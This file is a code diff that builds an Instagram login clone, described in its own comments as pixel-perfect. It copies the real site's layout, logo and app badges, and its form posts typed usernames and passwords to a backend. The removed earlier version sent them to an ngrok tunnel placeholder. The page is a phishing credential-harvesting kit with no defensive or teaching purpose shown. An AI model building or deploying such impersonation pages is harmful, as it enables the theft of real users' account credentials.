@@ -1,15 +1,499 @@
-<!-- index.html - Instagram Clone Page -->
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
+    
+    <!-- Font Awesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        /* ============================================================
+           INSTAGRAM LOGIN CLONE — PIXEL PERFECT
+           Colors, sizes, spacing EXACT match original
+           ============================================================ */
+        
+        /* --- RESET & BASE --- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: #fafafa;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        
+        /* --- MAIN CONTAINER --- */
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            max-width: 935px;
+            padding: 20px 0;
+        }
+        
+        /* --- PHONE MOCKUP (LEFT SIDE) --- */
+        .phone-mockup {
+            display: none;
+        }
+        
+        @media (min-width: 876px) {
+            .phone-mockup {
+                display: block;
+                flex: 0 0 454px;
+                margin-right: 32px;
+            }
+            .container {
+                flex-direction: row;
+                justify-content: center;
+                align-items: center;
+            }
+        }
+        
+        .phone-mockup img {
+            max-width: 100%;
+            height: auto;
+        }
+        
+        /* --- LOGIN BOX (RIGHT SIDE) --- */
+        .login-box {
+            background: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 40px 40px 20px;
+            width: 100%;
+            max-width: 350px;
+            margin-bottom: 10px;
+        }
+        
+        /* --- INSTAGRAM LOGO --- */
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo svg {
+            width: 175px;
+            height: 51px;
+        }
+        
+        /* --- LOGIN FORM --- */
+        .login-form {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .input-group {
+            margin-bottom: 6px;
+            position: relative;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 12px 8px 6px 8px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 14px;
+            background: #fafafa;
+            color: #262626;
+            outline: none;
+            transition: border-color 0.2s;
+            height: 38px;
+        }
+        
+        .input-group input:focus {
+            border-color: #a8a8a8;
+        }
+        
+        .input-group input::placeholder {
+            color: #8e8e8e;
+            font-size: 12px;
+            font-weight: 300;
+        }
+        
+        /* Floating label effect (like real Instagram) */
+        .input-group {
+            position: relative;
+        }
+        
+        .input-group label {
+            position: absolute;
+            left: 8px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #8e8e8e;
+            font-size: 12px;
+            pointer-events: none;
+            transition: all 0.1s ease;
+            font-weight: 300;
+        }
+        
+        .input-group input:focus + label,
+        .input-group input:not(:placeholder-shown) + label {
+            top: 6px;
+            transform: translateY(0);
+            font-size: 10px;
+            color: #8e8e8e;
+        }
+        
+        /* --- LOGIN BUTTON --- */
+        .login-btn {
+            width: 100%;
+            padding: 8px 0;
+            margin-top: 8px;
+            background: #0095f6;
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            height: 32px;
+        }
+        
+        .login-btn:hover {
+            background: #1877f2;
+        }
+        
+        .login-btn:active {
+            background: #0066b3;
+        }
+        
+        .login-btn:disabled {
+            opacity: 0.6;
+            cursor: default;
+        }
+        
+        /* --- DIVIDER --- */
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 16px 0 14px;
+        }
+        
+        .divider-line {
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+        
+        .divider-text {
+            padding: 0 18px;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        
+        /* --- FACEBOOK LOGIN --- */
+        .fb-login {
+            text-align: center;
+            margin-bottom: 18px;
+        }
+        
+        .fb-login a {
+            color: #385185;
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .fb-login a:hover {
+            text-decoration: underline;
+        }
+        
+        .fb-login i {
+            font-size: 20px;
+        }
+        
+        /* --- FORGOT PASSWORD --- */
+        .forgot-password {
+            text-align: center;
+            margin-bottom: 0;
+        }
+        
+        .forgot-password a {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+        }
+        
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+        
+        /* --- SIGNUP BOX --- */
+        .signup-box {
+            background: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px 40px;
+            width: 100%;
+            max-width: 350px;
+            text-align: center;
+            font-size: 14px;
+            color: #262626;
+        }
+        
+        .signup-box a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        
+        .signup-box a:hover {
+            text-decoration: underline;
+        }
+        
+        /* --- APP DOWNLOAD --- */
+        .app-download {
+            text-align: center;
+            margin-top: 20px;
+            width: 100%;
+            max-width: 350px;
+        }
+        
+        .app-download p {
+            font-size: 14px;
+            color: #262626;
+            margin-bottom: 16px;
+        }
+        
+        .app-download .stores {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+        
+        .app-download .stores img {
+            height: 40px;
+            width: auto;
+        }
+        
+        /* --- ERROR MESSAGE --- */
+        .error-msg {
+            color: #ed4956;
+            font-size: 13px;
+            text-align: center;
+            margin-bottom: 12px;
+            display: none;
+        }
+        
+        .error-msg.show {
+            display: block;
+        }
+        
+        /* --- RESPONSIVE --- */
+        @media (max-width: 450px) {
+            .login-box {
+                padding: 20px 20px 10px;
+                border: none;
+                background: transparent;
+            }
+            .signup-box {
+                border: none;
+                background: transparent;
+            }
+            body {
+                background: #ffffff;
+            }
+        }
+    </style>
 </head>
 <body>
-    <h1>Instagram Login</h1>
-    <form action="https://your-ngrok-url.ngrok.io/login" method="POST">
-        <input type="text" name="username" placeholder="Username">
-        <input type="password" name="password" placeholder="Password">
-        <button type="submit">Log In</button>
-    </form>
+
+    <div class="container">
+        
+        <!-- ============================================ -->
+        <!-- PHONE MOCKUP (DESKTOP ONLY)                   -->
+        <!-- ============================================ -->
+        <div class="phone-mockup">
+            <img src="https://www.instagram.com/static/images/homepage/phones/home-phones.png" alt="Instagram on phone">
+        </div>
+        
+        <!-- ============================================ -->
+        <!-- LOGIN BOX                                     -->
+        <!-- ============================================ -->
+        <div class="login-wrapper">
+            
+            <!-- --- MAIN LOGIN CARD --- -->
+            <div class="login-box">
+                
+                <!-- INSTAGRAM LOGO -->
+                <div class="logo">
+                    <svg aria-label="Instagram" viewBox="0 0 175 51">
+                        <defs>
+                            <linearGradient id="igLogo" x1="0%" y1="0%" x2="100%" y2="0%">
+                                <stop offset="0%" style="stop-color:#f09433" />
+                                <stop offset="25%" style="stop-color:#e6683c" />
+                                <stop offset="50%" style="stop-color:#dc2743" />
+                                <stop offset="75%" style="stop-color:#cc2366" />
+                                <stop offset="100%" style="stop-color:#bc1888" />
+                            </linearGradient>
+                        </defs>
+                        <text x="0" y="38" font-family="'Billabong', cursive" font-size="42" fill="url(#igLogo)">Instagram</text>
+                    </svg>
+                </div>
+                
+                <!-- ERROR MESSAGE -->
+                <div id="errorMsg" class="error-msg">
+                    <i class="fas fa-exclamation-circle"></i> 
+                    Sorry, your password was incorrect. Please double-check your password.
+                </div>
+                
+                <!-- LOGIN FORM -->
+                <form class="login-form" id="loginForm" method="POST" action="/login">
+                    
+                    <!-- Username Field -->
+                    <div class="input-group">
+                        <input type="text" id="username" name="username" placeholder=" " required autofocus>
+                        <label for="username">Phone number, username, or email</label>
+                    </div>
+                    
+                    <!-- Password Field -->
+                    <div class="input-group">
+                        <input type="password" id="password" name="password" placeholder=" " required>
+                        <label for="password">Password</label>
+                    </div>
+                    
+                    <!-- Login Button -->
+                    <button type="submit" class="login-btn" id="loginBtn">Log In</button>
+                    
+                </form>
+                
+                <!-- DIVIDER -->
+                <div class="divider">
+                    <div class="divider-line"></div>
+                    <div class="divider-text">OR</div>
+                    <div class="divider-line"></div>
+                </div>
+                
+                <!-- Facebook Login -->
+                <div class="fb-login">
+                    <a href="#">
+                        <i class="fab fa-facebook-square"></i>
+                        Log in with Facebook
+                    </a>
+                </div>
+                
+                <!-- Forgot Password -->
+                <div class="forgot-password">
+                    <a href="#">Forgot password?</a>
+                </div>
+                
+            </div>
+            
+            <!-- --- SIGNUP CARD --- -->
+            <div class="signup-box">
+                Don't have an account? <a href="#">Sign up</a>
+            </div>
+            
+            <!-- --- APP DOWNLOAD --- -->
+            <div class="app-download">
+                <p>Get the app.</p>
+                <div class="stores">
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png" alt="Download on App Store">
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png" alt="Get it on Google Play">
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    <!-- ============================================ -->
+    <!-- JAVASCRIPT — FORM VALIDATION + SUBMIT        -->
+    <!-- ============================================ -->
+    <script>
+        (function() {
+            
+            const form = document.getElementById('loginForm');
+            const username = document.getElementById('username');
+            const password = document.getElementById('password');
+            const btn = document.getElementById('loginBtn');
+            const errorMsg = document.getElementById('errorMsg');
+            
+            // --- Real-time validation (like original Instagram) ---
+            function validateForm() {
+                const u = username.value.trim();
+                const p = password.value.trim();
+                
+                if (u.length > 0 && p.length > 0) {
+                    btn.disabled = false;
+                    btn.style.opacity = '1';
+                } else {
+                    btn.disabled = true;
+                    btn.style.opacity = '0.6';
+                }
+            }
+            
+            username.addEventListener('input', validateForm);
+            password.addEventListener('input', validateForm);
+            
+            // --- Disable button initially ---
+            btn.disabled = true;
+            btn.style.opacity = '0.6';
+            
+            // --- Form submit ---
+            form.addEventListener('submit', function(e) {
+                const u = username.value.trim();
+                const p = password.value.trim();
+                
+                if (!u || !p) {
+                    e.preventDefault();
+                    errorMsg.classList.add('show');
+                    return;
+                }
+                
+                // Basic validation — if password is too short
+                if (p.length < 4) {
+                    e.preventDefault();
+                    errorMsg.textContent = 'Your password must be at least 4 characters.';
+                    errorMsg.classList.add('show');
+                    return;
+                }
+                
+                // Hide error if everything is fine
+                errorMsg.classList.remove('show');
+                errorMsg.textContent = 'Sorry, your password was incorrect. Please double-check your password.';
+                
+                // Allow form submission to backend
+                // The browser will POST to /login as defined in form action
+            });
+            
+            // --- Clicking "Forgot password?" shows a message ---
+            document.querySelector('.forgot-password a').addEventListener('click', function(e) {
+                e.preventDefault();
+                alert('🔐 Password reset link would be sent to your email.\n(This is a demo — no actual email will be sent.)');
+            });
+            
+            // --- Facebook login demo ---
+            document.querySelector('.fb-login a').addEventListener('click', function(e) {
+                e.preventDefault();
+                alert('🔵 Facebook login integration is ready.\n(This is a demo — actual Facebook OAuth not configured.)');
+            });
+            
+            // --- Sign up demo ---
+            document.querySelector('.signup-box a').addEventListener('click', function(e) {
+                e.preventDefault();
+                alert('📝 Sign up page would open.\n(This is a demo — no actual signup flow.)');
+            });
+            
+        })();
+    </script>
+
 </body>
 </html>
